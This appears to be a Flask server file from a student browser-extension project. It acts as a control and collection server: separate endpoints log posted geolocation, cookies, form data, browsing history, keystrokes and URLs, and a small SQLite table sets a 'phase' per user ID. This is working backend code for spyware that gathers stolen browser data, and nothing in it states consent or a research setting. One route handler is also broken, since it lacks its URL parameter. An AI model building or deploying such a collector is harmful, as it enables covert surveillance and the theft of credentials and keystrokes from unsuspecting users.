

#importing the necessary libraries
import flask 
from flask import Flask, request
from markupsafe import escape
import log
import os
import sqlite3 as sql
#creating an instance of the Flask class 
app = Flask(__name__,
            static_url_path='', 
            static_folder='Control/static',
            template_folder='Control/templates')
#https://stackoverflow.com/questions/20646822/how-to-serve-static-files-in-flask
DB_PATH = __file__[:-6]+"DB\\test.sqlite"

@app.route("/")
def hello_world():
    create_database()
    return flask.render_template("1.html")

#restart DB
@app.route("/initialize")
def initialize():
    log.main()
    return "Redoing all"

#Manage CROS error 


#defining a route for the control server 
@app.route('/control_server', methods=['POST'])
def control_server():

    #retrieving data from the request 
    #data = request.get_json()
    print(request.get_data())
    #processing the data and returning a response 
    #response = {'status': 'success'}
    

    return "thanks"

@app.route("/g", methods=['POST'])
def g():
    log.log("Geo", request.get_data())
    return "Done"
@app.route("/c", methods=['POST'])
def c():
    log.log("Coo", request.get_data())
    return "Done"
@app.route("/f", methods=['POST'])
def f():
    log.log("Form", request.get_data())
    return "Done"
@app.route("/h", methods=['POST'])
def h():
    log.log("His", request.get_data())
    return "Done"
@app.route("/k", methods=['POST'])
def k():
    log.log("Key", request.get_data())
    return "Done"
@app.route("/u", methods=['POST'])
def u():
    log.log("Url", request.get_data())
    return "Done"


@app.route("/req/<int:uid>", methods=['GET'])
def req():
    conn = sql.connect(DB_PATH)
    cur = conn.cursor()

    cur.execute("SELECT * FROM  Test")
    rows = cur.fetchall()

    conn.close()
    return "2"
#conda activate servers
#flask --app C:\Users\migue\Documents\TFG\TFGExtension\Server\app run


#https://stackoverflow.com/questions/67429333/flask-how-to-update-information-on-sqlite-based-on-button-input
#DATABASE CONNECTION SYSTEM:



def create_database():
    conn = sql.connect(DB_PATH)
    cur = conn.cursor()

    cur.execute("""
                CREATE TABLE IF NOT EXISTS Test (
                    uid INTEGER PRIMARY KEY,
                    phase INTEGER
                )                
                """)

    conn.commit()
    
    conn.close()
    
@app.route('/list')
def list():

    conn = sql.connect(DB_PATH)
    cur = conn.cursor()

    cur.execute("SELECT * FROM  Test")
    rows = cur.fetchall()

    conn.close()

    return flask.render_template("list.html", rows=rows)



@app.route('/edit/<int:number>', methods=['GET', 'POST'])
def edit(number):

    conn = sql.connect(DB_PATH)
    cur = conn.cursor()

    if request.method == 'POST':
        item_uid    = number
        item_phase = request.form['phase']
    
        cur.execute("UPDATE Test SET phase = ? WHERE uid = ?",
                    (item_phase, item_uid))
        conn.commit()
        
        return flask.redirect('/list') 
        
    cur.execute("SELECT * FROM Test WHERE uid = ?", (number,))
    item = cur.fetchone()
    
    conn.close()

    return flask.render_template("edit.html", item=item)


@app.route('/delete/<int:number>')
def delete(number):

    conn = sql.connect(DB_PATH)
    cur = conn.cursor()
        
    cur.execute("DELETE FROM Test WHERE uid = ?", (number,))

    conn.commit()
    
    conn.close()

    return flask.redirect('/list') 

@app.route('/add', methods=['GET', 'POST'])
def add():

    conn = sql.connect(DB_PATH)
    cur = conn.cursor()

    if request.method == 'POST':
        item_uid    = request.form['uid']
        item_phase = request.form['phase']

        
        cur.execute("""INSERT INTO Test (uid, phase) VALUES (?, ?)""", 
                    (item_uid, item_phase))
        conn.commit()
        
        return flask.redirect('/list') 
        
    return flask.render_template("add.html")


